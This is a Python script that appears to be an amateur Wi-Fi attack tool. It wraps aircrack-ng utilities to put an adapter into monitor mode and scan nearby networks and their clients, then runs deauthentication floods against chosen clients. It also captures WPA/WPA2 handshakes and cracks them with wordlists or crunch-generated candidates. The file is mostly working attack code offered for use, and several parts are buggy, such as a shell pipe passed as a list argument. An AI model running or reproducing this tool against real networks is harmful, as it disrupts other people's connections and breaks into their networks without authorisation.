import re
import subprocess as s
import time
import threading
import pandas as pd
from itertools import islice




def find_mac_finder():                                                          #to find NAN and its mac address
    global mac_name_reader, mac_name, mac, count, l, count_list                 #making all the var global so that all other function has access to it
    mac_name, mac, count, l, count_list = [], [], 0, "None", []
    ifconfig_all_result = (s.check_output("ifconfig")).decode()                 #check_output function prints on screen and returns as bytes type but re module accepts only str format, so converting bytes into str using .decode(
    mac_name_reader = re.findall(r"(^\w+)|\n(\w+)", ifconfig_all_result)        #this pythex captures network adapter name [NAN]
    for i in mac_name_reader:                                                   #since re returns as list type, using for loop to extract the str type NAN
        count += 1                                                              #counts the no. of [NAN]
        count_list.append(count)                                                #it appends the no. of NAN to count_list we can have the nos of NANs as index permanently
        for j in i:                                                             #this for is to remove the unwanted none string returned by re in mac_name_reader str
            if j != '':
                mac_name.append(j)                                              #the NAN alone gets added to mac_name
                ifconfig_par_result = (s.check_output(["ifconfig", j])).decode()#using this j-NAN to specifically  ifconfig command of NAN and using decode to convert bytes to str
                mac_reader = re.findall(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", ifconfig_par_result)#extracting the mac_address of the NAN using re
                if mac_reader != []:                                            #if it doesn't find the pattern, it returns a empty list which in case of lo NAN is satisfied
                    for m in mac_reader:                                        #so considering the above situation,using for loop to extract the mac
                        mac.append(m)
                else:
                    mac.append(l)
    global z
    for z in range(0, count):                                                   #to print the captured details in a specfic format we use for loop
        print(z + 1, ".", mac_name[z], "=", mac[z])                             #mac_name=list(NAN),mac=list(NAN mac address) 
    print(z + 2, ".", "Exit")


find_mac_finder()


def monitor():                                                                  #select the specific NAN to convert it to monitor mode
    loop = True
    global device
    device = int(input("select the device:"))
    while loop is True:
        if device == (2 or 1):
            print("Device not supported for monitor mode:")
            device = int(input("select the device:"))
        elif (device > 2) and (len(count_list) >= device):                      #to make sure the selected choice is external NAN
            s.call(["ifconfig", mac_name[device - 1], "down"])
            s.call(["iwconfig", mac_name[device - 1], "mode", "monitor"])       #these commands are for changing from managed to monitor mode
            s.call(["ifconfig", mac_name[device - 1], "up"])
            s.call(["iwconfig"])
            loop = False
        elif device > len(count_list):
            print("quitting...")
            loop = False
        else:
            print("Input correct choice")
            device = int(input("\nselect the device:"))


monitor()


def sniff():                                                   #to sniff the networks(wireless)
    global sniff
    print("\n1.To sniff 2.4 GHz")
    print("2.To sniff 5 GHz")
    print("3.To sniff both 2.4 and 5 GHz")
    sniff = int(input("Enter the network type to be sniffed:"))
    '''while timer > 0:'''


sniff()


def sniff_write():                                                                                           #this is same as sniff_print but this will happen background and the contents captured will then written to seperate txt file
    global sniffing
    with open('sniff_history.txt', 'w+') as sniffing:                                                            #to capture output it is desired to work with check_output rather than run,call,check_call functions
        if sniff == 1:                                                                                          #but the run, call, check_call returns as int type which is difficult to work with and converting them is a tough process
             s.run(["airodump-ng", mac_name[device - 1]], stdout=sniffing, universal_newlines=True)              #the re module accepts str type
        elif sniff == 2:                                                                          #But inspite all this the run module is used becoz the check_output was not able to write it in a file and i think it also found dificult to write in a variable as the contents were so numerous
            s.run(["airodump-ng", "--band", "a", mac_name[device - 1]], stdout=sniffing, universal_newlines=True)#stdout means standard_output, it captures and sends the output to the destination value and same can be done with std err which means standard_erroe
        elif sniff == 3:                                                                                        #it was said that the when universal_newlines=True is given it would be changed to string format but it don happen and same with the case of text=true
            s.run(["airodump-ng", "--band", "abg", mac_name[device - 1]], stdout=sniffing, universal_newlines=True)
    print('quitting sniff_write...')

sniff_write_thread = threading.Thread(target=sniff_write)                                                       #this .thread(target=function) enables to run in background
sniff_write_thread.start()                                                                                      #.start()start the required function in background


def sniff_print():
    if sniff == 1:
        s.call(["airodump-ng", mac_name[device - 1], "--manufacturer", "-U", "-W"])                       #these three commands enables to sniff real time and prints on real time
    elif sniff == 2:                                                                             #mac_name[device - 1] denotes network adapter name
        s.call(["airodump-ng", "--band", "a", mac_name[device - 1], "-x", "-M", "-U", "-W"])
    elif sniff == 3:
        s.call(["airodump-ng", "--band", "abg", mac_name[device - 1], "-x", "-M", "-U", "-W"])
    print('quitting sniff_print...')


sniff_print()


def sniff_read1():
    with open('sniff_history.txt', 'r') as file1:        #opening the file where the live capturing by sniff_write in backgroun
        with open('sniff_reverse.txt', "w+") as file2:      #now writing this to another by reversing it becoz all neccessary are available at last
            for line in reversed(file1.readlines()):
                file2.writelines(line)                      #the reversed now gets writed to new file


sniff_read1()


def sniff_read2():
    time.sleep(2)
    global sniffing
    sniffing = ""
    N = int(input("\nEnter the  Number of lines to capture:"))
    with open("sniff_reverse.txt", "r") as file2:                   #opening the reversed file
        with open("sniff_reduced.txt", "w+") as file3:              #now extracting the first n lines which contain all the available info
            file3.writelines(islice(file2, N))                      #now writing n lines in str format from int type so by islice method is used here
            head = list(islice(file2, N))#islice function from itertools module is used becoz the file type contents is of int type which is returned by subprocess call,run function and now it is converting it into str type and is inserted into a list
        for i in head:
            sniffing = sniffing + i                                 #now writing the contents from the list in str var sniffing since the re module doesn't accept list type and accepts str type


sniff_read2()


def sniff_Organiser():                                      #to organise and the core info and data which later is used for attacks
    global sniff_info , sniff_dataframe
    sniff_data, sniff_info, bssids, stations = (), [], [], []             #extracting available networks, its channel nos, its mac address
    sniffing_reader = re.findall(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w).*\s(\d{1,2})\s.*PSK\s(.*)(?=.) | (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w).*\s*\d\s*\d\s*\d\s*(\d).*(<\w+:\s*\d>)\s+(?=.)",sniffing)
    for data in sniffing_reader:
        [bssid, channel, ESSID, none1, none2, none3] = data    #Unpacking becoz to remove none strings elements returned by re.findall
        if bssid not in bssids:                                #this condition is given to prevent collecting and duplicating the info by checking the bssid since it is unique one
            bssids.append(bssid)
            ESSID = re.findall(r"[^['](\b.*\b)", ESSID)         #extracting only wifi name i.e removing unwanted spaces
            for a in ESSID:                                     #but the re .findall returns as list type but we need in the format of string so extracting wifi name i.e str from the list
                essid = a
                sniff_data = [bssid, channel, essid, []]            #sniff_data acts as temp and parses all the info to sniff_info which is permanent
                sniff_info.append(sniff_data)
    sniffing_reader2 = re.findall(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)\s*(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", sniffing)#to extract coonected devices
    for b in sniff_info:                                        # this condition is to collect the connected device and add to the info list
        stations.clear()
        for c in sniffing_reader2:
            if b[0] == c[0]:                                    #checks that the bssid of AP and station(clients) are same
                for d in c:                                     #reading the bssid in sniff_reader2 as elements
                    if d != c[0]:                               #make sure that the bssid of stations only get appended and not APs
                        if d not in stations:                   #make sure that the same bssid of stations does get appended again
                            stations.append(d)                  #this is temp and checks are done in this
                            b[3].append(d)                      #appends in sniff_info i.e.,sniff_info[all][3]
    sniff_dataframe = pd.DataFrame(sniff_info, columns=["#######BSSID#######", "Channel", "********ESSID*******", "--------------------------------------------------Connected device--------------------------------------"])  #creates the dataframe with getting data from sniff_info list


sniff_Organiser()


def target():
    global select
    X = True
    while X == True:
        print("\n", sniff_dataframe, "\n")
        print('\nWould you like to sniff particular network?')
        print("1.YES")
        print("2.NO")
        want = (input("\nEnter your choice:"))
        if "1" in want:
            select = int(input("Select the network to target:"))
            s.run(["airodump-ng", "--bssid", sniff_info[select][0], "--channel", sniff_info[select][1], "--write", "targetpy", mac_name[device - 1], "-x", "-M", "-U", "-W"])
        elif "2" in want:
            print("ok exiting...")
            X = False


target()


def attacks():
    global attack_type

    print("\n What type of attack you would like to try on ", sniff_info[select][0])
    print("1.Deauthentication attack")
    print("2.Fake Authenticatiion atteck")
    print("3.WEP attack")
    print("4.WPS attack")
    print("5.WPA/WPA2 attack")
    print("6.Creating a word List")
    print("\n Enter the type of attack to be done:")
    attack_type = int(input("Enter the choice of yours:"))


attacks()


def deauth_attack():
        if attack_type == 1:
            print("\nOn which client you would like to perform the attack:")
            for i in range(len(sniff_dataframe.iloc[select, 3])):
                print(i, ".", sniff_dataframe.iloc[select, 3][i])
            print(len(sniff_dataframe.iloc[select, 3]), ". On all of the clients of mentioned AP(bssid):")
            i = int(input("\nEnter the station to deauthenticate:"))
            packets = (input("\nEnter the no. of packets to be sent to deauthenticate:"))
            if (i >= 0) and (i < len(sniff_dataframe.iloc[select, 3])):
                s.call(["aireplay-ng", "--deauth", packets, "-a", sniff_info[select][0], "-c", sniff_dataframe.iloc[select, 3][i], "-D", mac_name[device - 1]])
            elif i == len(sniff_dataframe.iloc[select, 3]):
                time = float(input("Enter the time interval to be deauthenticate (in seconds):"))
                try:
                    s.run(["aireplay-ng", "--deauth", packets, "-a", sniff_info[select][0], "-D", mac_name[device - 1]], timeout=time)
                except s.TimeoutExpired:
                    pass
            attacks()

deauth_attack()


def wpa2_attack():
    global i, handshake, wordlist
    if attack_type == 5:
        print("\nOn which client you would like to perform the attack:")
        for i in range(len(sniff_dataframe.iloc[select, 3])):
            print(i, ".", sniff_dataframe.iloc[select, 3][i])
        print(len(sniff_dataframe.iloc[select, 3]), ". On all of the clients of mentioned AP(bssid):")
        i = int(input("\nEnter the station to deauthenticate:"))
        print("\n Do you Handshake Key: ")
        print("1.YES")
        print("2.NO")
        handshake = int(input("Enter here:"))
        print("\n Do you Wordlist: ")
        print("1.YES")
        print("2.NO")
        wordlist = int(input("Enter here:"))


wpa2_attack()


def wpa2_attack_handshake_presence():
    global handshake_file
    if attack_type == 5 and handshake == 1:
        files = s.check_output(["ls"]).decode()
        capfile = re.findall(r"(target.*\.cap)", files)
        for file in range(0, len(capfile)):
            print(file, ".", capfile[file])
        print("\nchoose the correct file which has correct Handshake Key:")
        fileno = int(input("Enter the file no."))
        handshake_file = capfile[fileno]


wpa2_attack_handshake_presence()


def deauth():
    if attack_type == 5 and handshake == 2:
        if (i >= 0) and (i < len(sniff_dataframe.iloc[select, 3])):
            s.call(["aireplay-ng", "--deauth", "10", "-a", sniff_info[select][0], "-c", sniff_dataframe.iloc[select, 3][i], "-D", mac_name[device - 1]])
        elif i == len(sniff_dataframe.iloc[select, 3]):
            s.run(["aireplay-ng", "--deauth", "10", "-a", sniff_info[select][0], "-D", mac_name[device - 1]])


p1 = threading.Thread(target=deauth)
p1.start()


def wpa2_attack_handshake_absence():
    global handshake_file
    if attack_type == 5 and handshake == 2:
        s.run(["airodump-ng", "--bssid", sniff_info[select][0], "--channel", sniff_info[select][1], "--write", "targetpy", mac_name[device - 1]])
        files = s.check_output(["ls"]).decode()
        capfile = re.findall(r"(target.*\.cap)", files)
        handshake_file = capfile[-1]


wpa2_attack_handshake_absence()


def wordlist_presence():
    x = True
    if attack_type == 5 and handshake == 2 and wordlist == 1:
        print("1.A specific wordlist :")
        print("2.All available wordlist:")
        while x == True:
            type = int(input("Enter your choice:"))
            wordlists = s.check_output(["ls", "wordlist"]).decode()
            if type == 1:
                for i in range(0, len(wordlists.split())):
                    print(i, ".", wordlists.split()[i])
                word = int(input("\nEnter your choice:"))
                s.call(["aircrack-ng", handshake_file, "-w", wordlists.split()[word]])
                again = int(input("Do you want to repeat again"))
                print("1.Yes")
                print("2.No")
                if again == 2:
                    x = False
                    wpa2_attack()
            elif type == 2:
                for i in range(0, len(wordlists.split())):
                    s.call(["aircrack-ng", handshake_file, "-w", wordlists.split()[i]])
                again = int(input("Do you want to repeat again"))
                print("1.Yes")
                print("2.No")
                if again == 2:
                    x = False
                    wpa2_attack()

wordlist_presence()


def wordlist_absence():
    x = True
    if attack_type == 5 and handshake == 2 and wordlist == 2:
        print("\n1.Creating own custom wordlist:")
        print("2.Creating automated wordlist(but less only available):")
        while x == True:
            wordlist_type = int(input("Enter your choice"))
            if wordlist_type == 1:
                min = input("\nEnter the minimum number:")
                max = input("\nEnter the maximum number:")
                pattern_range = input("\nEnter the pattern_range")
                specific_pattern = input("\nEnter the pattern")
                permute = input("\nEnter the pattern_range")    
                s.call(["crunch", min, max, pattern_range, "-p", permute, "-t", specific_pattern,"|", "aircrack-ng", "-w", "-", "-b", sniff_info[select][0], handshake_file])
                again = int(input("Do you want to repeat again"))
                print("1.Yes")
                print("2.No")
                if again == 2:
                    x = False
                    wpa2_attack()
            elif wordlist_type == 2:
                min = input("\nEnter the minimum number:")
                max = input("\nEnter the maximum number:")
                pattern_range = input("\nEnter the pattern_range")
                s.call(["crunch", min, max, pattern_range, "|", "aircrack-ng","-b", sniff_info[select][0], handshake_file, "-w", "-"])
                again = int(input("Do you want to repeat again"))
                print("1.Yes")
                print("2.No")
                if again == 2:
                    x = False
                    wpa2_attack()

wordlist_absence()

